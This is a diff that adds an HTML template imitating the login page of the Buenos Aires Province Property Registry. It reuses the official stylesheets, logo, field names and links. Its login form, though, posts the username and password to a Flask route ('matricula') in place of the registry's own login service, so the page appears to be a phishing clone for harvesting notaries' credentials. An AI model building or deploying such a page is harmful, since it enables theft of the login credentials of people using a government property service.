@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<head><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
+<link rel="stylesheet" type="text/css" media="print" href='https://servicios.rpba.gob.ar/style/comun/styleServiciosWeb2011Print.min.css' />
+<link rel="stylesheet" type="text/css" media="screen" href='https://servicios.rpba.gob.ar/style/comun/SiteMesh.php?decorator=identity' />
+<style type="text/css">
+#toolbar1{background-color: rgba(51,51,51,0.52);color:#FFF;height:45px;}
+#toolbar1 ul{margin:0;padding: 0;list-style: none;}
+#toolbar1 li{display: inline;margin: 0 0 0 0;padding: 0;text-transform:uppercase;}
+#toolbar1 a{float: left;display: block;color: #FFFFFF;text-decoration: none;margin: 0 0 0 0;padding: 10px 10px;}
+#toolbar1 a:hover{background-color:rgba(51,51,51,0.42)}
+</style>
+</head>
+
+
+<body class="--bs-info">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz" crossorigin="anonymous"></script>    
+<!-- #main-navigation -->
+<div id="contenedor">
+		<div id="title">
+		<div style="background-color: #009aae;">
+
+<!--<a href="https://www.ec.gba.gov.ar">-->
+<a href="https://www.gba.gob.ar/hacienda_y_finanzas">
+		<img src="https://servicios.rpba.gob.ar/images/comun/logo_gba_footer_blanco.png" alt="Ministerio de Economía de la Provincia de Buenos Aires" style="border:0px;height:95px;margin-left:10px">
+</a>
+</div>
+<TABLE id="toolbar1" width="100%">
+	<tr>
+		<td>
+			<ul>
+				<li><a title="Inicio" href='/index.php'>INICIO</a></li>
+        <li><a title='Gobierno de la Provincia de Buenos Aires' target="_blank" href='http://www.gba.gov.ar'>PORTAL DE LA PROVINCIA</a></li>
+			</ul>
+		</td>
+		<TD width="26%" style="text-align: right;">
+			<FONT color="#fdfdfd" size="2" face="Tahoma">
+				Martes, 3 de Octubre de 2023								
+			</font>
+		</td>
+	</tr>
+</table>
+
+
+		</div>
+		
+			<div id="menu">
+				
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div id="menu_hor_izq">
+	
+</div>
+
+<div id="menu_hor_line">
+	<hr>
+</div>
+			</div>
+		
+		<div id="cuerpo">
+			<div id="error">
+				
+			</div>
+			<div class="exito mensaje">
+				
+			</div>
+			<div id="contenidoCuerpo">
+				
+				
+				
+    <div id="login">
+		<form action='{{ url_for('matricula')}}' method="post" >			<input type="hidden" name="josso_cmd" value="login">
+			<input type="hidden" name="RPBAExterno" value="externo">
+			<div class="titulo">
+				Portal de Servicios para Usuarios Suscriptos
+			</div>
+			<table class="formulario">
+				<tbody><tr>
+					<td class="nombreFormulario"> 
+						Usuario
+					</td>
+					<input type="hidden" name="cadena" class="form-control"></input>
+					<td class="separadorCampoFormulario">
+						:
+					</td>
+					<td class="campoFormulario"> 
+						<input type="text" name="josso_username" maxlength="10" size="10" tabindex="1" value="">
+					</td>
+				</tr>
+				<tr> 
+					<td class="nombreFormulario"> 
+						Contraseña
+					</td>
+					<td class="separadorCampoFormulario">
+						:
+					</td>
+					<td class="campoFormulario"> 
+						<input type="password" name="josso_password" maxlength="10" size="10" tabindex="2" value="" id="josso_password">
+					</td>
+				</tr>
+			</tbody></table>
+			<div id="botonera">
+				<button class="btn btn-outline-success ms-2">Enviar</button>
+			</div>
+			<hr>
+			<div>
+				<div id="botones" style="display:none;"><input type="Button" value="1" onclick="anadir(&#39;1&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="2" onclick="anadir(&#39;2&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="3" onclick="anadir(&#39;3&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="4" onclick="anadir(&#39;4&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="5" onclick="anadir(&#39;5&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="6" onclick="anadir(&#39;6&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="7" onclick="anadir(&#39;7&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="8" onclick="anadir(&#39;8&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="9" onclick="anadir(&#39;9&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="0" onclick="anadir(&#39;0&#39;,&#39;josso_password&#39;)">&nbsp;<br><br><input type="Button" value="Q" onclick="anadir(&#39;Q&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="W" onclick="anadir(&#39;W&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="E" onclick="anadir(&#39;E&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="R" onclick="anadir(&#39;R&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="T" onclick="anadir(&#39;T&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="Y" onclick="anadir(&#39;Y&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="U" onclick="anadir(&#39;U&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="I" onclick="anadir(&#39;I&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="O" onclick="anadir(&#39;O&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="P" onclick="anadir(&#39;P&#39;,&#39;josso_password&#39;)">&nbsp;<br><br><input type="Button" value="A" onclick="anadir(&#39;A&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="S" onclick="anadir(&#39;S&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="D" onclick="anadir(&#39;D&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="F" onclick="anadir(&#39;F&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="G" onclick="anadir(&#39;G&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="H" onclick="anadir(&#39;H&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="J" onclick="anadir(&#39;J&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="K" onclick="anadir(&#39;K&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="L" onclick="anadir(&#39;L&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="�" onclick="anadir(&#39;�&#39;,&#39;josso_password&#39;)">&nbsp;<br><br><input type="Button" value="Z" onclick="anadir(&#39;Z&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="X" onclick="anadir(&#39;X&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="C" onclick="anadir(&#39;C&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="V" onclick="anadir(&#39;V&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="B" onclick="anadir(&#39;B&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="N" onclick="anadir(&#39;N&#39;,&#39;josso_password&#39;)">&nbsp;<input type="Button" value="M" onclick="anadir(&#39;M&#39;,&#39;josso_password&#39;)">&nbsp;<input alt="Borrar" type="Button" value="Borrar" onclick="anadir(&#39;&lt;&lt;&#39;,&#39;josso_password&#39;)"><br><input type="Button" value="Espacio" onclick="anadir(&#39; &#39;,&#39;josso_password&#39;)"><input alt="Limpiar" type="Button" value="Limpiar" onclick="anadir(&#39;!!&#39;,&#39;josso_password&#39;)"><br><br><input type="checkbox" name="mayusculas" onclick="cambiomayus(this)" checked="">Mayusculas</div>
+				<script>
+					var letras="";
+					var p=0;
+					for (a=0;a<Tletras.length;a++){
+						letras=letras+"<input  type='Button' value="+Tletras[a]+" onclick=anadir('"+Tletras[a]+"','josso_password')>&nbsp;";
+						p=p+1;
+						if(p==10){
+							p=0;
+							letras=letras+"<br><br>";
+						}
+					}
+					var botones =document.getElementById("botones");
+					botones.innerHTML=letras+"<input alt='Borrar' type='Button' value='Borrar' onClick=anadir('<<','josso_password')><br><input type='Button' value='Espacio' onclick=anadir('&#160','josso_password')><input alt='Limpiar' type='Button' value='Limpiar' onClick=anadir('!!','josso_password')><br></br><input type='checkbox' name='mayusculas' onclick='cambiomayus(this)' checked>Mayusculas";
+				</script>
+				<a id="pregunta" href="javascript:mostrar()">Mostrar teclado</a><br>
+			</div>
+		</form>
+<script type="text/javascript" language="JavaScript">
+  <!--
+  var focusControl = document.forms["usernamePasswordLoginForm"].elements["josso_username"];
+
+  if (focusControl != null && focusControl.type != "hidden" && !focusControl.disabled && focusControl.style.display != "none") {
+     focusControl.focus();
+  }
+  // -->
+</script>
+
+		<a href="https://servicios.rpba.gob.ar/RegPropNew/selfservices/lostpassword/lostPassword.do?josso_cmd=lostPwd&amp;RPBAExterno=1">Olvidé mi contraseña / Usuario bloqueado</a>
+	</div>
+	<script type="JavaScript">
+		anadir('!!','josso_password');
+	</script>
+	<div class="mensaje">
+		Sr. Escribano: Para activar su cuenta en el nuevo portal, por unica vez, haga click <a href="https://servicios.rpba.gob.ar/admUsuario/activacion/jsp/habilitar.jsp">aqui</a>
+	</div>
+
+				
+				
+				
+				
+			</div>
+		</div>
+		<div id="corte"></div>
+		
+			
+		<div id="pie">
+<b>Ministerio de Hacienda y Finanzas </b> | Dirección Provincial del Registro de la Propiedad
+</div>
+	</div>
+
+</body></html>
